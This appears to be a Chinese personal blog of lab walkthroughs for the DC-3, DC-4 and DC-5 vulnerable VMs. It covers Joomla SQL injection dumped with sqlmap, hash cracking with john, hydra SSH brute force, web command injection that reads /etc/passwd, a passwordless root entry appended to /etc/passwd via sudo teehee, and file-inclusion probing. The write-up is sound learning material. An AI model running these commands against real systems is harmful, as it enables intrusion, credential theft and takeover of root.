<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l   &#x2F;&#x2F;本次靶机ip：192.168.136.131</span><br><span class="line">nmap -A -v 192.168.136.131   &#x2F;&#x2F;获取开启端口信息</span><br><span class="line">ping 192.168.136.131  &#x2F;&#x2F;点开网站之后，点击wappalyzer插件，查看网站搭建信息。获取CMS为Joomla，当然使用 whatweb 命令也可以进行指纹识别（CMS扫描），得到CMS版本后，就搜寻相关漏洞即可。</span><br><span class="line">joomscan -url http:&#x2F;&#x2F;192.168.136.131&#x2F;  &#x2F;&#x2F;mad一定要注意url格式，别打错。获取joomla的版本信息，以及其后台登陆地址，获取后点开后台网址，就可以看到一个登陆页面。</span><br><span class="line">searchspolit joomla 3.7.0   &#x2F;&#x2F;搜寻相关版本漏洞，发现存在sql注入，并且有利用文档在kali自带漏洞库，并且给出路径。</span><br><span class="line">cd &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;</span><br><span class="line">cat 43033.txt  &#x2F;&#x2F;这些都是searchsploit给出</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211106134000221.png" alt="image-20211106134000221"></p>
<p>非常好，非常好，利用方法就差点喂给我了。接下来就交给自动化注入sqlmap吧。</p>
<p>sqlmap参数参考：<a href="https://blog.csdn.net/Breeze_CAT/article/details/80628392" target="_blank" rel="noopener">https://blog.csdn.net/Breeze_CAT/article/details/80628392</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库：</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.136.131&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211106134458306.png" alt="image-20211106134458306"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆joomladb表</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.136.131&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering] -D joomladb --tables</span><br></pre></td></tr></table></figure>
<p>这里我遇到了sqlmap版本过低，找寻更新方法的时候，却忘记了kali可以直接install没有的应用，那我直接<code>cd /usr/share</code> ，<code>rm -rf sqlmap</code>，然后<code>sqlmap</code>，就可以下载最新版的sqlmap了。</p>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211106135732842.png" alt="image-20211106135732842"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆_users表</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.136.131&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; --columns</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211106140815468.png" alt="image-20211106140815468"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆username和password</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.136.131&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering] -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211106141432224.png" alt="image-20211106141432224"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;</span><br><span class="line">vim 1.txt   &#x2F;&#x2F;写入hash进入1.txt</span><br><span class="line">john 1.txt  &#x2F;&#x2F;得到密码：snoopy</span><br><span class="line">成功登陆后台。</span><br></pre></td></tr></table></figure>
<p>2021/11/8 号时，就已经被设置后门难住，对自我产生怀疑，现在虽然知道方法，个人认为，为了加深记忆，后面在回过头设置，注意msf使用，对于新手，可以说是一款非常棒的工具，其次还要注意各种漏洞的学习，挖掘其本质。</p>
<h2 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h2><h3 id="前置知识-3"><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="kali中bp的使用"><a href="#kali中bp的使用" class="headerlink" title="kali中bp的使用"></a>kali中bp的使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#打开命令行</span><br><span class="line">burpsuite  &#x2F;&#x2F;即可打开</span><br><span class="line">#火狐设置代理，下载switchomega，照搬windows配置</span><br><span class="line">#这边bp被锁功能，要自己安装一个。。。。也可以装pro</span><br></pre></td></tr></table></figure>
<h4 id="熟悉kali自带的任何板块"><a href="#熟悉kali自带的任何板块" class="headerlink" title="熟悉kali自带的任何板块"></a>熟悉kali自带的任何板块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里就提一嘴kali自带字典，有时候可以就直接再kali整，不用出去。</span><br><span class="line">share是个很不错的地方</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114001105744.png" alt="image-20211114001105744"></p>
<h4 id="一些拿到交互端口后的信息收集"><a href="#一些拿到交互端口后的信息收集" class="headerlink" title="一些拿到交互端口后的信息收集"></a>一些拿到交互端口后的信息收集</h4><p>linux命令参考手册：<a href="https://www.runoob.com/linux/linux-command-manual.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-command-manual.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># id  &#x2F;&#x2F;无选项时，打印真实以及有效的用户和所在组的信息</span><br><span class="line"># unmame   &#x2F;&#x2F;linux中查询系统基本信息的命令</span><br></pre></td></tr></table></figure>
<h4 id="linux中的ect文件目录"><a href="#linux中的ect文件目录" class="headerlink" title="linux中的ect文件目录"></a>linux中的ect文件目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">etc不是什么缩写，是and so on的意思 来源于 法语的 et cetera 翻译成中文就是 等等 的意思. 至于为什么在&#x2F;etc下面存放配置文件， 按照原始的UNIX的说法(linux文件结构参考UNIX的教学实现MINIX) 这下面放的都是一堆零零碎碎的东西, 就叫etc, 这其实是个历史遗留.</span><br><span class="line"></span><br><span class="line">这个目录一般用来存放程序所需的整个文件系统的配置文件.</span><br><span class="line"></span><br><span class="line">&#x2F;etc目录</span><br><span class="line">　　包含很多文件.许多网络配置文件也在&#x2F;etc 中. </span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;rc   or&#x2F;etc&#x2F;rc.d   or&#x2F;etc&#x2F;rc*.d  </span><br><span class="line">　　启动、或改变运行级时运行的scripts或scripts的目录. </span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;passwd  </span><br><span class="line">　　用户数据库，其中的域给出了用户名、真实姓名、家目录、加密的口令和用户的其他信息. </span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;fdprm  </span><br><span class="line">　　软盘参数表.说明不同的软盘格式.用setfdprm 设置.</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;fstab  </span><br><span class="line">　　启动时mount -a命令(在&#x2F;etc&#x2F;rc 或等效的启动文件中)自动mount的文件系统列表.Linux下，也包括用swapon -a启用的swap区的信息.</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;group  </span><br><span class="line">　　类似&#x2F;etc&#x2F;passwd ，但说明的不是用户而是组. </span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;inittab  </span><br><span class="line">　　init 的配置文件. </span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;issue  </span><br><span class="line">　　getty在登录提示符前的输出信息.通常包括系统的一段短说明或欢迎信息.内容由系统管理员确定. </span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;magic  </span><br><span class="line">　　file 的配置文件.包含不同文件格式的说明，file 基于它猜测文件类型.</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;motd  </span><br><span class="line">　　Message Of TheDay，成功登录后自动输出.内容由系统管理员确定.经常用于通告信息，如计划关机时间的警告. </span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;mtab  </span><br><span class="line">　　当前安装的文件系统列表.由scripts初始化，并由mount 命令自动更新.需要一个当前安装的文件系统的列表时使用，例如df命令. </span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;shadow  </span><br><span class="line">　　在安装了影子口令软件的系统上的影子口令文件.影子口令文件将&#x2F;etc&#x2F;passwd 文件中的加密口令移动到&#x2F;etc&#x2F;shadow中，而后者只对root可读.这使破译口令更困难. </span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;login.defs  </span><br><span class="line">　　login 命令的配置文件. </span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;printcap  </span><br><span class="line">　　类似&#x2F;etc&#x2F;termcap ，但针对打印机.语法不同. </span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;profile , &#x2F;etc&#x2F;csh.login ,&#x2F;etc&#x2F;csh.cshrc  </span><br><span class="line">　　登录或启动时Bourne或Cshells执行的文件.这允许系统管理员为所有用户建立全局缺省环境. </span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;securetty  </span><br><span class="line">　　确认安全终端，即哪个终端允许root登录.一般只列出虚拟控制台，这样就不可能(至少很困难)通过modem或网络闯入系统并得到超级用户特权. </span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;shells  </span><br><span class="line">　　列出可信任的shell.chsh 命令允许用户在本文件指定范围内改变登录shell.提供一台机器FTP服务的服务进程ftpd检查用户shell是否列在 &#x2F;etc&#x2F;shells 文件中，如果不是将不允许该用户登录. </span><br><span class="line">&#x2F;etc&#x2F;termcap  </span><br><span class="line">　　终端性能数据库.说明不同的终端用什么&quot;转义序列&quot;控制.写程序时不直接输出转义序列(这样只能工作于特定品牌的终端)，而是从&#x2F;etc&#x2F;termcap中查找要做的工作的正确序列.这样，多数的程序可以在多数终端上运行</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#关于&#x2F;etc&#x2F;passwd与&#x2F;etc&#x2F;shadow</span><br><span class="line">http:&#x2F;&#x2F;mambainveins.gitee.io&#x2F;mambainveins&#x2F;2020&#x2F;08&#x2F;11&#x2F;2020-08-11-linux_etc_passwd_shadow&#x2F;</span><br></pre></td></tr></table></figure>
<h4 id="linux中的var文件目录"><a href="#linux中的var文件目录" class="headerlink" title="linux中的var文件目录"></a>linux中的var文件目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以存放mail</span><br><span class="line">再补充</span><br></pre></td></tr></table></figure>
<h4 id="Mydra九头蛇多协议爆破"><a href="#Mydra九头蛇多协议爆破" class="headerlink" title="Mydra九头蛇多协议爆破"></a>Mydra九头蛇多协议爆破</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">语法：Hydra 参数 IP 服务</span><br><span class="line">用途举例：</span><br><span class="line">-暴破ssh登录密码</span><br><span class="line">-FTP协议破解</span><br><span class="line">-http协议破解</span><br><span class="line">-路由器破解</span><br><span class="line">-http-proxy协议破解</span><br><span class="line">-Windows远程桌面</span><br><span class="line">-smb破解</span><br><span class="line">。。。。</span><br><span class="line">https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6967928172369149988</span><br></pre></td></tr></table></figure>
<h4 id="echo等写入命令"><a href="#echo等写入命令" class="headerlink" title="echo等写入命令"></a>echo等写入命令</h4><p>混眼熟</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;liuchuanfeng&#x2F;p&#x2F;6893680.html</span><br></pre></td></tr></table></figure>
<h3 id="DC-4实操"><a href="#DC-4实操" class="headerlink" title="DC-4实操"></a>DC-4实操</h3><p>打开靶机，设置网络模式为nat（老三样）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l  &#x2F;&#x2F;得到192，168.136.135</span><br><span class="line">nmap -sS 192.168.136.135  &#x2F;&#x2F;或者 nmap -A -v 192.168.136.135得到端口信息，发现就只是简简单单的80端口和22端口（这里是ssh端口，基本确实是ssh链接）</span><br></pre></td></tr></table></figure>
<p>浏览器url栏输入 192.168.136.135，发现是一个简答的登陆界面，这时候就不去查什么中间件，直接抓包。</p>
<p>这里我丢出去物理机跑了，得到账号:密码：admin:happy，得到下图。</p>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114001246001.png" alt="image-20211114001246001"></p>
<p>进入command后，点击RUN，下图</p>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114001348042.png" alt="image-20211114001348042"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以看到，这是一条 ls -l 的输出，抓包查看在哪里输入命令</span><br><span class="line">可以发现修改radio的值可以输入命令</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114132404045.png" alt="image-20211114132404045"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#如何在交互式输出无选项下获取信息</span><br><span class="line"># id  &#x2F;&#x2F;无选项时，打印真实以及有效的用户和所在组的信息</span><br><span class="line"># unmame -a    &#x2F;&#x2F;linux中查询系统基本信息的命令,-a参数是-all，输出所有信息</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114132819518.png" alt="image-20211114132819518"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;ect&#x2F;passwd  &#x2F;&#x2F;查看用户密码，emm这个思路有点难猜。</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114221918811.png" alt="image-20211114221918811"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#x2F;etc&#x2F;passwd文件可用于写入提权</span><br><span class="line">用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</span><br></pre></td></tr></table></figure>
<p>继续</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114222825317.png" alt="image-20211114222825317"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;jim  &#x2F;&#x2F;轮番查询后，只有jim可打开</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114222934886.png" alt="image-20211114222934886"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;jim&#x2F;backups  &#x2F;&#x2F;轮番查询，只记录有用信息。</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114223058235.png" alt="image-20211114223058235"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;jim&#x2F;backups&#x2F;old-passwords.bak   &#x2F;&#x2F;看来后需要有爆破步骤，没事，复制下来保存进kali或者物理机，其实这里更推荐使用自己找的万能字典。</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114223228652.png" alt="image-20211114223228652"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用hydra对jim用户ssh登录密码进行爆破登录，前期端口扫描埋下了伏笔，22端口开启</span><br><span class="line">hydra -l jim -P 1.txt ssh:&#x2F;&#x2F;192.168.136.135</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114223729238.png" alt="image-20211114223729238"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用ssh连接</span><br><span class="line">ssh jim@192.168.136.135</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114223828724.png" alt="image-20211114223828724"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">连接上去后，有提示mail，就是说一定要注意观察，哪怕看着别人的笔记写，也要自己做一遍，不然做等于没做。</span><br><span class="line">发现是charles发的，那就去sudo charles</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114224112713.png" alt="image-20211114224112713"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh charles@192.168.136.135  &#x2F;&#x2F;中途因为kali不能给我复制那串密码，我给换到其他地方了</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114224615692.png" alt="image-20211114224615692"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -l  &#x2F;&#x2F;-l参数显示出自己（执行 sudo 的使用者）的权限</span><br><span class="line">发现 root权限且无密码执行：&#x2F;usr&#x2F;bin&#x2F;teehee，查询相关知识，发现其 -a参数可以写入</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114224811243.png" alt="image-20211114224811243"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这边复现的时候遇到了一个问题，就是说最后一步提权使用</span><br><span class="line">echo &quot;admin::0:0:::&#x2F;bin&#x2F;bash&quot; | sudo teehee -a &#x2F;etc&#x2F;passwd</span><br><span class="line">执行失败，su admin 的时候仍然需要密码，正好看到一个师傅的博客有另外一种teehee提权，如下图。</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211114225448117.png" alt="image-20211114225448117"></p>
<p>下次有机会鼓捣一下是啥问题。</p>
<p>最后，切换root账户，下次没思路我就切换root，找了半天，就可以了，图床报错，没有截图</p>
<h2 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h2><h3 id="前置知识-4"><a href="#前置知识-4" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="网站目录爆破"><a href="#网站目录爆破" class="headerlink" title="网站目录爆破"></a>网站目录爆破</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7kbscan，御剑扫描，kali自带的dirb（这个我爆不出来，shit！别人都可以），还有appscans也可以扫出目录</span><br><span class="line">burp（使用fuzz中的目录字典SubdomainDicts），传至intruder模块：下图演示：</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211117163326486.png" alt="image-20211117163326486"></p>
<p>正常爆破即可，这里值得注意的是，爆破目录是有后缀的，比如什么<code>.php</code>，<code>.txt</code>，本机带的子域名字典直接load是不行的，全部404，还需要添加相关后缀才可。</p>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211117163724272.png" alt="image-20211117163724272"></p>
<p>当然，也可以在这里添加相关后缀（也可以再添加一个变量用来提供后缀选择）：</p>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211117163813198.png" alt="image-20211117163813198"></p>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211117163828310.png" alt="image-20211117163828310"></p>
<p>灵活点即可，多试试。但是我还是不理解，别人的其他工具就行，我的就不行，我很气啊！！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.srcmini.com&#x2F;60926.html  &#x2F;&#x2F;DirBuster使用 </span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_42580577&#x2F;article&#x2F;details&#x2F;89715126  &#x2F;&#x2F;kali的字典wordlist介绍</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211117165129944.png" alt="image-20211117165129944"></p>
<h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通俗易懂的讲解：</span><br><span class="line">https:&#x2F;&#x2F;www.csdn.net&#x2F;tags&#x2F;MtTaEgysMDc4NDA3LWJsb2cO0O0O.html</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">理解：</span><br><span class="line">使用php包含函数调用公用函数时，被包含的文件被替换成恶意文件，信任前端输入，被恶意文件执行一句话等被getshell，以及各种姿势拿shell。</span><br><span class="line"></span><br><span class="line">上传的木马，可能被网站杀毒软件删除，可以利用access日志文件access.log，</span><br><span class="line">其次，调用php文件也可以查看敏感目录，就是直接开waf可以防御。</span><br><span class="line"></span><br><span class="line">但该次靶场就直接写入日志，可防杀。(还有很多要学，后渗透乏力)</span><br></pre></td></tr></table></figure>
<h5 id="中间件是什么？"><a href="#中间件是什么？" class="headerlink" title="中间件是什么？"></a>中间件是什么？</h5><p><code>中间件（middleware)是基础软件的一大类，属于可复用软件的范畴。顾名思义，中间件处于操作系统和用户的应用软件的中间。（阿里云文章）</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.coderxing.com&#x2F;what-is-middleware-for-architecture.html</span><br></pre></td></tr></table></figure>
<p><code>中间件（英语：Middleware），又译中间件，是提供系统软件（这里指控制硬件的软件，多指操作系统）和应用软件之间连接的软件，以便于软件各部件之间的沟通，特别是应用软件对于系统软件的集中的逻辑，在现代信息技术应用框架如Web服务、面向服务的体系结构等中应用比较广泛。（维基百科），总的来说，用以运行网站源码；实现高效传输。有Tomcat，apache，nginx等。</code></p>
<p><code>中间件不仅仅就这几个，这几个只是网站架构中的中间件；中间件起中介作用，类似于汇聚信息，广发于市，有需求即可申请，等待，取回信息，而不用大费周章，耗费多资源获得，所以需要数据交换和管理的地方都可能出现中间件用以提高效率；当然，中间件也有自己的独特，中间件不负责业务逻辑，不负责底层的硬件逻辑，凡是在这之间的系统都可以理解成“中间件”。（贤哥逻辑）</code></p>
<p>本次用到的nginx又是什么级别的中间件呢？<br><code>Nginx是一款轻量级的Web服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like协议下发行，其特点是占用内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好。
中国大陆使用 nginx 的网站用户有：百度、京东、新浪、网易、腾讯、淘宝。</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ujoy.net&#x2F;topics&#x2F;4867460</span><br></pre></td></tr></table></figure>
<h3 id="DC-5实操"><a href="#DC-5实操" class="headerlink" title="DC-5实操"></a>DC-5实操</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -A -v 192.168.136.129   &#x2F;&#x2F;开放情况如下图</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/19/dROstf5q7hZ1lSb.png" alt="image-20211119114728513"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">那就登陆上去，经过一番不解释点击</span><br><span class="line">发现在留言界面，点击提交后，多次刷新，界面标copyright 20yx 会在thankyou.php目录下更改x(x&#x3D;7,8,9,0),y(y&#x3D;1,2)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/19/3CMsLo9yYpbDvfA.png" alt="image-20211119115136055"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">没有思路，扫一下网站目录吧，先后尝试了 dirb ， 7kbscan ， dirsearch ，dirbuster ，甚至都上了appscans。。。。</span><br><span class="line">直到dirbuster才发现一个脚本，也就是包含文件！！我很不理解！！！！为什么前面几个扫不出来！！！我很森气！</span><br></pre></td></tr></table></figure>
<p>所以这里我采用了很多办法，都是扫不出footer.php，只有<code>DirBuster</code>:</p>
<p><img src="https://i.loli.net/2021/11/17/jkOXtVJb1ecCB6l.png" alt="image-20211117204452432"></p>
<p>于是就很自然的访问 <a href="http://192.168.136.129/footer.php" target="_blank" rel="noopener">http://192.168.136.129/footer.php</a>  ，看看是都可以包含，直接去</p>
<p><img src="https://i.loli.net/2021/11/19/dv5gQLxW6mOy2pK.png" alt="image-20211119130732278"></p>
<p>然后知道中间件是nginx，然后尝试使用包含一下其他文件，看看行不行</p>
<p><img src="https://i.loli.net/2021/11/19/L4dgRnowFzDX3lq.png" alt="image-20211119133450535"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其实这里需要爆破一下到底哪个变量动态包含，在不写死的情况下，爆破一下变量,哈哈，这里是知道了的，记得常常看看文件上传的相关wp。</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/19/7H4qMBUfIjJQurh.png" alt="image-20211119140211754"></p>
<p><img src="https://i.loli.net/2021/11/19/mX8IbgWuv9UVDKr.png" alt="image-20211119140129987"></p>
